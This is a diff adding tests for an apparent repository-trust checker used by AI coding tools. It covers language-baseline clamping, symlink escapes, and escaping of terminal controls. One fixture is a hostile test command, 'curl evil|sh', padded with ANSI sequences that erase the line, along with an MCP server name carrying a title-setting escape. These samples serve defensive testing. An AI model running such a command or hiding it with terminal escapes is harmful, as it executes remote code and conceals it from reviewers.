@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
-import { mkdtempSync, mkdirSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { mkdtempSync, mkdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import {
@@ -7,6 +7,8 @@ import {
   clampGuardToBaseline,
   clearRepoTrust,
   collectRepoExecutionConfig,
+  collectRepoInventory,
+  escapeTerminalControls,
   evaluateRepoTrust,
   formatRepoTrustReport,
   guardBaselineForLanguage,
@@ -113,6 +115,17 @@ describe("collectRepoExecutionConfig", () => {
     const c = collectRepoExecutionConfig(repo);
     expect(c.testCommand).toBe("pnpm vitest run");
     expect(c.mcpServers.map((s) => s.name)).toEqual(["evil", "rex"]);
+  });
+
+  it("takes the test command from the project config's rex section when it overrides .rex/config.json, as rex does", () => {
+    writeJson(".rex/config.json", { test: "pnpm vitest run" });
+    const base = collectRepoExecutionConfig(repo);
+
+    writeJson(".n-dx.json", { rex: { test: "node -e \"0\"" } });
+    const over = collectRepoExecutionConfig(repo);
+    expect(over.testCommand).toBe("node -e \"0\"");
+    expect(over.sources).toEqual([".rex/config.json", ".n-dx.json"]);
+    expect(over.digest).not.toBe(base.digest);
   });
 
   it("ignores .n-dx.local.json, which is the user's own", () => {
@@ -235,6 +248,69 @@ describe("assessRepoExecutionConfig", () => {
     expect(codes).not.toContain("env-allow-added");
   });
 
+  it("takes the baseline from marker files, so a JS/TS checkout declaring swift cannot keep xcodebuild", () => {
+    writeJson("package.json", { name: "x" });
+    const swiftGuard = { ...guardBaselineForLanguage("swift"), allowedCommands: ["swift", "make", "xcodebuild", "xcrun", "git"] };
+    writeJson(".hench/config.json", { language: "swift", guard: swiftGuard });
+
+    const config = collectRepoExecutionConfig(repo);
+    expect(config.language).toBe("swift");
+    expect(config.detectedLanguage).toBe("typescript");
+
+    const findings = assessRepoExecutionConfig(config);
+    const byCode = Object.fromEntries(findings.map((f) => [f.code, f]));
+    expect(byCode["commands-added"].values).toEqual(expect.arrayContaining(["xcodebuild", "xcrun"]));
+    expect(byCode["language-mismatch"].severity).toBe("warning");
+    expect(byCode["language-mismatch"].message).toContain("swift");
+    expect(byCode["language-mismatch"].message).toContain("JavaScript/TypeScript");
+
+    const ev = evaluateRepoTrust(repo, { ndxHome: home });
+    expect(ev.state).toBe("untrusted");
+    expect(ev.restricted).toBe(true);
+
+    const clamped = clampGuardToBaseline(swiftGuard, guardBaselineForLanguage(config.detectedLanguage));
+    expect(clamped.allowedCommands).not.toContain("xcodebuild");
+    expect(clamped.allowedCommands).not.toContain("xcrun");
+  });
+
+  it("reads the declared language from the project config as well and still uses the detected baseline", () => {
+    writeJson(".n-dx.json", { hench: { language: "go", guard: { ...guardBaselineForLanguage("go") } } });
+    const config = collectRepoExecutionConfig(repo);
+    const codes = assessRepoExecutionConfig(config).map((f) => f.code);
+    expect(config.detectedLanguage).toBe("typescript");
+    expect(codes).toContain("language-mismatch");
+    expect(codes).toContain("commands-added");
+  });
+
+  it.each([
+    ["go", "go.mod", false],
+    ["swift", "Package.swift", false],
+    ["swift", "App.xcodeproj", true],
+    ["swift", "App.xcworkspace", true],
+  ])("raises no mismatch for a %s checkout (%s) declaring its own language", (language, marker, isDir) => {
+    if (isDir) mkdirSync(join(repo, marker));
+    else writeFileSync(join(repo, marker), "");
+    writeJson(".hench/config.json", { language, guard: guardBaselineForLanguage(language) });
+    const config = collectRepoExecutionConfig(repo);
+    expect(config.detectedLanguage).toBe(language);
+    const codes = assessRepoExecutionConfig(config).map((f) => f.code);
+    expect(codes).not.toContain("language-mismatch");
+    expect(codes).not.toContain("commands-added");
+  });
+
+  it("treats javascript and typescript as one baseline, and ignores a declared value that names none", () => {
+    for (const language of ["javascript", "typescript", "auto", "rust"]) {
+      writeJson(".hench/config.json", { language, guard: DEFAULT_GUARD });
+      const codes = assessRepoExecutionConfig(collectRepoExecutionConfig(repo)).map((f) => f.code);
+      expect(codes, language).not.toContain("language-mismatch");
+    }
+  });
+
+  it("does not count a file named like an Xcode project as a swift marker", () => {
+    writeFileSync(join(repo, "App.xcodeproj"), "");
+    expect(collectRepoExecutionConfig(repo).detectedLanguage).toBe("typescript");
+  });
+
   it("accepts the .ndx container layout's blocked path as covering hench and rex", () => {
     writeJson(".hench/config.json", { guard: { ...DEFAULT_GUARD, blockedPaths: [".ndx/**", ".git/**"] } });
     const codes = assessRepoExecutionConfig(collectRepoExecutionConfig(repo)).map((f) => f.code);
@@ -296,6 +372,77 @@ describe("evaluateRepoTrust and the trust store", () => {
   });
 });
 
+describe("collectRepoInventory and symlinks (#686 finding 4)", () => {
+  let outside: string;
+
+  beforeEach(() => {
+    outside = mkdtempSync(join(tmpdir(), "ndx-trust-outside-"));
+    for (const name of ["x", "y", "z"]) {
+      mkdirSync(join(outside, name), { recursive: true });
+      writeFileSync(join(outside, name, "index.md"), `# ${name}`);
+    }
+  });
+
+  afterEach(() => {
+    rmSync(outside, { recursive: true, force: true });
+  });
+
+  /** A directory link; a junction on Windows, which needs no privilege. */
+  function linkDir(target: string, path: string): void {
+    symlinkSync(target, path, process.platform === "win32" ? "junction" : "dir");
+  }
+
+  function item(rel: string): void {
+    mkdirSync(join(repo, rel), { recursive: true });
+    writeFileSync(join(repo, rel, "index.md"), "# item");
+  }
+
+  it("does not count items behind a link to a directory outside the repository", () => {
+    item(".rex/prd_tree/epic-a");
+    linkDir(outside, join(repo, ".rex", "prd_tree", "ext"));
+    expect(collectRepoInventory(repo).prd).toEqual({ items: 1, epics: 1 });
+  });
+
+  it("returns promptly on a symlink loop and counts only the real item", () => {
+    item(".rex/prd_tree/epic-a");
+    linkDir(join(repo, ".rex", "prd_tree"), join(repo, ".rex", "prd_tree", "epic-a", "loop"));
+    expect(collectRepoInventory(repo).prd).toEqual({ items: 1, epics: 1 });
+  });
+
+  it("ignores a tree root that is itself a link out of the repository", () => {
+    mkdirSync(join(repo, ".rex"), { recursive: true });
+    linkDir(outside, join(repo, ".rex", "prd_tree"));
+    expect(collectRepoInventory(repo).prd).toBeNull();
+  });
+
+  for (const rexDir of [".rex", ".ndx/rex"]) {
+    it(`walks prd_tree, product and changes under ${rexDir} with the same rules`, () => {
+      item(`${rexDir}/prd_tree/epic-a`);
+      item(`${rexDir}/product/capability-a`);
+      writeFileSync(join(repo, rexDir, "product", "index.md"), "# product root header");
+      item(`${rexDir}/changes/change-a/task-b`);
+      writeFileSync(join(repo, rexDir, "changes", "change-a", "index.md"), "# change");
+      for (const root of ["prd_tree", "product", "changes"]) {
+        linkDir(outside, join(repo, rexDir, root, "ext"));
+      }
+      expect(collectRepoInventory(repo).prd).toEqual({ items: 4, epics: 3 });
+    });
+  }
+});
+
+describe("escapeTerminalControls", () => {
+  it("renders C0, DEL, C1 and bidi controls as visible escapes and leaves other text alone", () => {
+    expect(escapeTerminalControls("a\u0000\t\n\u007f\u0085‮⁦b é ✓")).toBe(
+      "a\\x00\\x09\\x0a\\x7f\\x85\\u202e\\u2066b é ✓",
+    );
+  });
+
+  it("is idempotent", () => {
+    const once = escapeTerminalControls("x\u001b[2K\r");
+    expect(escapeTerminalControls(once)).toBe(once);
+  });
+});
+
 describe("formatRepoTrustReport", () => {
   it("names the state, the findings, the inventory and the accept command", () => {
     writeJson(".hench/config.json", { guard: { ...DEFAULT_GUARD, allowedCommands: [...DEFAULT_GUARD.allowedCommands, "bash"] } });
@@ -308,9 +455,66 @@ describe("formatRepoTrustReport", () => {
     expect(lines.at(-1)).toContain("ndx trust accept .");
   });
 
+  it("escapes terminal control characters in repository values; the digest keeps the raw value", () => {
+    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
+    writeJson(".rex/config.json", { test: command });
+    writeJson(".mcp.json", { mcpServers: { "x\u001b]0;t\u0007": { command: "run\u009b2K" } } });
+    writeJson(".sourcevision/manifest.json", { analyzedAt: "2026\r\u001b[2K" });
+
+    const ev = evaluateRepoTrust(repo, { ndxHome: home });
+    const lines = formatRepoTrustReport(ev, { inventory: true });
+    for (const line of lines) expect(line).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
+    const text = lines.join("\n");
+    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
+    expect(text).toContain("x\\x1b]0;t\\x07: run\\x9b2K");
+
+    // Display only: the evaluated config and finding values stay raw, and an
+    // acceptance recorded from them matches the same raw config.
+    expect(ev.config.testCommand).toBe(command);
+    expect(ev.findings.find((f) => f.code === "test-command")?.values).toEqual([command]);
+    recordRepoTrust(repo, { ndxHome: home });
+    expect(evaluateRepoTrust(repo, { ndxHome: home }).state).toBe("trusted");
+  });
+
   it("is one quiet line for a baseline repository", () => {
     expect(formatRepoTrustReport(evaluateRepoTrust(repo, { ndxHome: home }))).toEqual([
       "Repository execution config: matches the defaults (nothing to trust).",
     ]);
+  });
+
+  // #686 finding 2 follow-up: a plain test command leaves the checkout
+  // baseline, yet verify_criteria and rex verify refuse it until accepted.
+  it("names an unaccepted test command on a baseline checkout and how to accept it", () => {
+    writeJson(".rex/config.json", { test: 'node -e "process.exit(0)"' });
+    const ev = evaluateRepoTrust(repo, { ndxHome: home });
+    expect(ev.state).toBe("baseline");
+    const lines = formatRepoTrustReport(ev, { acceptCommand: "hench trust accept ." });
+    const text = lines.join("\n");
+    expect(text).not.toContain("nothing to trust");
+    expect(lines[0]).toContain("not accepted");
+    expect(text).toContain('node -e "process.exit(0)"');
+    expect(lines.at(-1)).toContain("hench trust accept .");
+    expect(lines.at(-1)).toContain("verify_criteria and rex verify");
+  });
+
+  it("reports an accepted test command on a baseline checkout", () => {
+    writeJson(".rex/config.json", { test: 'node -e "process.exit(0)"' });
+    const record = recordRepoTrust(repo, { ndxHome: home });
+    const ev = evaluateRepoTrust(repo, { ndxHome: home });
+    expect(ev.state).toBe("baseline");
+    const lines = formatRepoTrustReport(ev);
+    const text = lines.join("\n");
+    expect(text).not.toContain("nothing to trust");
+    expect(lines[0]).toContain(`test command accepted by you on ${record.trustedAt}`);
+    expect(text).not.toContain("ndx trust accept .");
+  });
+
+  it("treats a record for another config as not accepting the test command", () => {
+    writeJson(".rex/config.json", { test: "node a.js" });
+    recordRepoTrust(repo, { ndxHome: home });
+    writeJson(".rex/config.json", { test: "node b.js" });
+    const lines = formatRepoTrustReport(evaluateRepoTrust(repo, { ndxHome: home }));
+    expect(lines[0]).toContain("not accepted");
+    expect(lines.at(-1)).toContain("ndx trust accept .");
   });
 });
